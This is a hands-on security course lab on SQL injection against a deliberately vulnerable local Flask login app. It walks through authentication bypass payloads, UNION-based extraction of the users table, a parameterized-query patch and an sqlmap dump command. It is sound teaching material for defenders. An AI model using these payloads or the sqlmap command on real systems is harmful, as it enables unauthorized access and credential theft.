# Lab 16 — SQL Injection

**Phase:** 5 | **Estimated time:** 4–5 hours | **Type:** Attack-Defense

---

## Overview

SQL injection has appeared in the OWASP Top 10 every year since 2003. It is the attack
that compromised Yahoo in 2012 (450,000 credentials), Sony PlayStation Network in 2011
(77 million accounts), and thousands of smaller targets every year. It works because
applications construct SQL queries by concatenating user input — turning a form field
into a place where database commands can be injected.

This lab follows the mandatory attack-defense sequence: observe the vulnerability,
exploit it manually without tools, patch it, then verify the patch holds against
the same payloads. Finally, `sqlmap` is used to automate what was done by hand.

After this lab, you will be able to:
- Identify string-concatenation query construction as a SQL injection vulnerability
- Bypass a login form using authentication bypass payloads
- Extract data from a database using UNION-based injection
- Patch SQL injection with parameterized queries
- Run `sqlmap` against a target and interpret its output

---

## Prerequisites

- [ ] Lab 8 complete (SQL fundamentals — SELECT, WHERE, basic query structure)
- [ ] Lab 10 complete (auth — login flow, session handling)
- [ ] Tools installed:
  - `python3` and `pip`
  - `flask` — `pip install flask`
  - `sqlmap` — [install](https://sqlmap.org) or `pip install sqlmap`
  - `curl`
- [ ] The starter app: `starter/app.py` in this lab directory

---

## Concepts

### 2.1 How SQL Injection Happens

SQL injection is not a subtle or complex vulnerability. It is the direct consequence of
one mistake: building a SQL query by concatenating user-supplied strings instead of using
the database driver's parameterization mechanism.

Consider this query construction in Python:
```python
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
```

If `username` is `alice` and `password` is `hunter2`, the resulting SQL is:
```sql
SELECT * FROM users WHERE username = 'alice' AND password = 'hunter2'
```

This is the intended query. Now suppose `username` is `' OR 1=1 --` and `password` is
anything. The resulting SQL is:
```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'anything'
```

`--` is the SQL comment delimiter. Everything after it is ignored. `OR 1=1` is always
true. The query now returns all users. The application sees a non-empty result set and
treats it as a successful login.

The root cause is that user input was treated as trusted SQL syntax rather than as a
data value. Parameterized queries — also called prepared statements — separate the query
structure from the data values entirely, making this injection impossible by design.

<details>
<summary>Mental model check — answer before expanding</summary>

**Question:** A developer "fixes" SQL injection by filtering out the `'` (single quote)
character from user input before concatenating it into the query. Why is this not a
complete fix?

**Answer:** Single-quote filtering is an incomplete denylist approach. It fails for
several reasons: (1) other injection techniques do not require quotes — numeric fields
can be injected without them (`WHERE id = ` + userid where userid is `1 OR 1=1`);
(2) encoding tricks can bypass quote filters (`\'` or `%27` or `\x27` depending on
how the filter is implemented and how the database decodes the string); (3) second-order
injection — where data is stored sanitized but later retrieved and re-inserted into a
query without sanitization. The only complete fix is parameterized queries, which make
the data value structurally incapable of influencing the query syntax.

</details>

---

### 2.2 Authentication Bypass

The most immediately impactful form of SQL injection against a login form is
authentication bypass: making the query return a valid user row without knowing any
password.

The general strategy is to inject SQL that makes the `WHERE` clause always true, or
that comments out the password check entirely.

Common authentication bypass payloads:
```
' OR '1'='1
' OR 1=1 --
' OR 1=1 #         (MySQL uses # as comment delimiter too)
admin' --
' OR 'x'='x
```

For a query like:
```sql
SELECT * FROM users WHERE username = '[input]' AND password = '[input]'
```

The payload `admin' --` in the username field produces:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```

This returns the `admin` row without needing the password.

<details>
<summary>Mental model check — answer before expanding</summary>

**Question:** The login form has two fields. An attacker wants to log in specifically
as the `admin` user (not just any user). Which field should the injection payload go
in, and why does it matter which field is targeted?

**Answer:** The injection goes in the username field. The goal is to select the `admin`
row specifically, so `admin' --` closes the username string after `admin`, then comments
out the rest of the query including the password check. Injecting in the password field
instead (with `' OR 1=1 --`) would return the first user in the table, which may or may
not be admin. Targeting username allows selecting a specific account by name while
bypassing its password.

</details>

---

### 2.3 UNION-Based Data Extraction

Authentication bypass is just entry. Once SQL injection is confirmed, the next step is
data extraction. The `UNION` operator appends the results of a second `SELECT` to the
first. If the attacker can control the second `SELECT`, they can read any table the
database user has access to.

For UNION injection to work, two conditions must hold:
1. The injected `SELECT` must return the same number of columns as the original
2. The data types in each column must be compatible

The process:
1. Determine the column count: try `' UNION SELECT NULL --`, then `' UNION SELECT NULL,NULL --`, etc., until no error
2. Identify which columns are displayed: `' UNION SELECT 'a','b','c' --` — see which value appears in the response
3. Extract data: `' UNION SELECT username,password,role FROM users --`

This is how an injection in a product search field can expose the entire user table,
even though the original query was only meant to search products.

<details>
<summary>Mental model check — answer before expanding</summary>

**Question:** A `UNION SELECT` attack requires knowing the number of columns in the
original query. An error-based technique uses database error messages to find this.
If the application suppresses all error messages (showing only a generic "something
went wrong"), what technique can still determine the column count blindly?

**Answer:** Boolean-based blind injection. Instead of reading error messages, the
attacker infers information from whether the application returns a result (true branch)
or no result (false branch). For column count: `' UNION SELECT NULL --` produces an
error if the column count is wrong (which manifests as "no results" rather than an
error message in the UI). Incrementing NULL columns until the query succeeds reveals
the count. This is slower and requires more requests, but works when errors are
suppressed — which is why suppressing errors is not a defense against SQL injection,
only against enumeration.

</details>

---

## Exercises

### Exercise 1 — [OBSERVE] Read the Vulnerable Code

**Setup:** Open `starter/app.py` in your text editor.

**Task:**
Find the SQL query construction in the `/login` route. Read it carefully and answer in `notes.md`:
1. What Python variable contains the query string?
2. Which parts of the query come from user input?
3. Where exactly could an attacker inject SQL — in the username, the password, or both?
4. What does the application do if the query returns a row? If it returns nothing?

**Success condition:** You can point to the exact line that is vulnerable and explain in one sentence why it is injectable.

**Why this matters:** The ability to read code and identify injection points before
running any tools is the skill that separates a competent tester from a tool operator.
Every vulnerability scanner can find this. Being able to find it by reading code — and
to find it in more obscure forms — requires understanding the pattern, not just knowing
the tool.

---

### Exercise 2 — [OBSERVE] Run the App and Verify Normal Behavior

**Setup:** Terminal in the `starter/` directory.

**Task:**
1. Run `python app.py`
2. Visit `http://localhost:5000`
3. Log in with `alice` / `hunter2` — confirm it works
4. Log in with a wrong password — confirm it fails
5. Note what the response looks like for success vs. failure (status code, page content)

**Success condition:** Successful login shows the dashboard with username and role. Failed login shows the error message. You have confirmed the application behaves as intended before attacking it.

**Why this matters:** Always establish a baseline before testing. An attacker who skips
this step may spend time injecting into a form that is already broken, or may not
recognize when an injection has succeeded because they don't know what success looks like.

---

### Exercise 3 — [ATTACK] Authentication Bypass

**Setup:** App running on `http://localhost:5000`.

**Task:**
Without knowing the admin password, log in as `admin`.

Try the following username inputs with any password:
1. `' OR 1=1 --`
2. `admin' --`
3. `' OR '1'='1`

For each attempt, note: what SQL query was actually executed, what the app returned,
and whether you are logged in as admin or as a different user.

**Success condition:** You are logged into the dashboard as `admin` with role `admin`, using a payload in the username field with a random string as the password.

<details>
<summary>What you should see (expand after attempting)</summary>

`' OR 1=1 --` logs in as the first user in the table (whichever row SQLite returns
first — likely `admin` if it was inserted first, but not guaranteed).

`admin' --` specifically targets the admin account. The resulting query is:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
```
The password check is commented out entirely. SQLite finds the `admin` row and returns it.

`' OR '1'='1` is equivalent to `OR 1=1` — the string `'1'` equals itself, making the
condition always true.

If any payload logs in as a user other than admin, it confirms injection works but
the payload selected the wrong row. The `admin' --` payload is the precise one.

</details>

**Why this matters:** This is the attack that compromised the login forms of thousands
of web applications. The payload `' OR 1=1 --` was seen in breach data as far back as
2003. It is still found on live targets. The fix is three characters of code change.

---

### Exercise 4 — [ATTACK] Extract All Users with UNION Injection

**Setup:** App running. This exercise uses the username field in the login form.

**Task:**
Using UNION-based injection in the username field, extract the username, password, and
role of every user in the `users` table.

Steps:
1. First determine the column count of the original query. The original SELECT returns
   all columns from `users` — check `app.py` to see how many columns that is, then
   craft a matching UNION payload.
2. Craft a UNION payload that selects `username, password, role` from the `users` table.
   Hint: you need to match the total column count of the original query, padding with
   `NULL` for columns you do not need.
3. The response will display the first row returned. Use `LIMIT 1 OFFSET 1` in the
   injected SELECT to retrieve the second user.

Record both users' passwords in `notes.md`.

**Success condition:** You have retrieved the plaintext passwords for both `admin` and `alice` using only the login form.

<details>
<summary>Injection payload structure (expand after attempting)</summary>

The `users` table has 4 columns: `id, username, password, role`.

A matching UNION payload:
```
' UNION SELECT id,username,password,role FROM users LIMIT 1 OFFSET 0 --
```

This closes the original username string, appends a UNION that returns the first row
of the users table, and comments out the rest. The app's response renders
`username` and `role` from the returned row — which are now the injected values.

For the second user:
```
' UNION SELECT id,username,password,role FROM users LIMIT 1 OFFSET 1 --
```

If the column count were unknown, start with `' UNION SELECT NULL --` and add NULLs
one at a time until the error disappears (matching the 4-column original query).

</details>

**Why this matters:** This is the step that turns "I bypassed a login" into "I have
every credential in the database." In real targets, the same technique applies to any
injectable parameter — search fields, sort orders, ID parameters. The login form is
just the easiest to demonstrate.

---

### Exercise 5 — [PATCH] Fix the Injection with Parameterized Queries

**Setup:** `starter/app.py` open in editor. App still running (Flask will reload on save with `debug=True`).

**Task:**
Find the vulnerable query in the `/login` route (marked with a TODO comment).
Replace it with a parameterized query using SQLite's placeholder syntax.

Attempt your own fix before expanding the reference below.

The interface to use:
```python
db.execute("SELECT ...", (value1, value2))
```

After saving, re-run all three attack payloads from Exercise 3. They should now fail.

**Success condition:** All injection payloads from Exercises 3 and 4 are rejected — the login form returns "Invalid credentials" for them. Legitimate login with `alice`/`hunter2` still works.

<details>
<summary>Reference patch (expand after attempting your own)</summary>

Replace:
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
user = db.execute(query).fetchone()
```

With:
```python
user = db.execute(
    "SELECT * FROM users WHERE username = ? AND password = ?",
    (username, password)
).fetchone()
```

The `?` placeholders are filled by the database driver, which handles all escaping
internally. The query structure is fixed at parse time — user input is passed as data,
never as syntax. No amount of SQL syntax in the input can change what the query does.

Note what changed: the f-string is gone. The query string is a plain string literal.
The values are passed as a separate tuple. This is the entire fix.

</details>

**Why this matters:** The fix is trivially small. The vulnerability it closes is
trivially large. This asymmetry — a few characters of code preventing a complete
database compromise — is why SQL injection has been OWASP #1 or #2 since the list
began. The fix requires knowing the parameterization API exists and choosing to use it.

---

### Exercise 6 — [ATTACK] Run sqlmap Against the Vulnerable Version

**Setup:** Revert `app.py` to the vulnerable version (uncomment the f-string and comment out the parameterized query, or use `git diff` / `git stash` to restore it).

**Task:**
With the vulnerable version running, use `sqlmap` to automate what was done manually:

```bash
sqlmap -u "http://localhost:5000/login" \
  --data="username=test&password=test" \
  --method=POST \
  --dbms=sqlite \
  --dump \
  --batch
```

Observe the output and identify:
1. Which parameter sqlmap identified as injectable
2. Which injection technique(s) it used
3. What data it extracted from the database

**Success condition:** sqlmap successfully identifies the injection, identifies the injection type, and dumps the `users` table.

<details>
<summary>What you should see (expand after attempting)</summary>

sqlmap will identify the `username` parameter as injectable (and likely `password` too).
It will report the injection type — typically boolean-based blind and/or time-based blind
for SQLite, though the direct UNION technique also works.

The `--dump` flag causes it to enumerate and dump all accessible tables. The `users`
table will appear with all rows and columns, matching the manual extraction from Exercise 4.

Key difference from manual exploitation: sqlmap may take a different path to the same
result. It often uses boolean-based blind injection even when UNION injection is possible,
because its detection heuristics are conservative. The manual approach in Exercise 4 was
faster for a known UNION-injectable target.

</details>

**Why this matters:** sqlmap can find and exploit SQL injection in seconds. Every target
accessible on the internet faces this. Understanding what sqlmap does under the hood —
which is exactly what was done manually — is what allows a tester to interpret its output,
handle cases where it fails, and understand the severity of what it found.

---

## Reflection

*Write your answers in `notes.md` before moving to the next lab.*

**Tier 1 — Recall**

1. In one sentence, explain why parameterized queries prevent SQL injection when string concatenation does not.

2. What is the purpose of the `--` or `#` at the end of most SQL injection payloads?

**Tier 2 — Application**

3. A search endpoint builds its query as:
   ```python
   query = f"SELECT * FROM products WHERE category = '{category}' ORDER BY price"
   ```
   The `category` parameter comes from a URL query string: `/search?category=books`.
   Describe the exact payload that would extract all usernames from a `users` table,
   assuming the `users` table has columns `id`, `username`, `password`.

4. An application uses parameterized queries everywhere except one place: it constructs
   the `ORDER BY` column name dynamically from user input (`ORDER BY {sort_field}`).
   Why can't `ORDER BY` use a standard placeholder, and what is the correct mitigation?

**Tier 3 — Transfer**

5. The 2008 Heartland Payment Systems breach (at the time, the largest payment card
   breach in history — 130 million card numbers) was initiated via SQL injection against
   a web application. Research the breach and answer: what did the attackers do after
   the initial SQL injection to move from the web application to the payment card data,
   and what does that tell you about the blast radius of a single injectable parameter?

---

## Going Deeper

- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection): The canonical reference on injection types, attack vectors, and defenses. The "Testing for SQL Injection" sub-page covers the manual techniques used in this lab in more depth.
- [sqlmap documentation](https://github.com/sqlmapproject/sqlmap/wiki/Usage): The full sqlmap usage guide. The `--technique`, `--level`, and `--risk` flags change how aggressively it tests — understanding these is important before running it against targets you are authorized to test.
- [PortSwigger Web Security Academy — SQL Injection](https://portswigger.net/web-security/sql-injection): The best free interactive SQL injection practice environment. The labs here go beyond what this lab covers — blind injection, out-of-band extraction, second-order injection.
- [CVE-2008-3984 and the Heartland breach analysis](https://www.computerworld.com/article/2527185/heartland-payment-systems-suffers-massive-data-breach.html): Coverage of one of the most consequential SQL injection exploits in history — the direct consequence of exactly the code pattern fixed in Exercise 5.
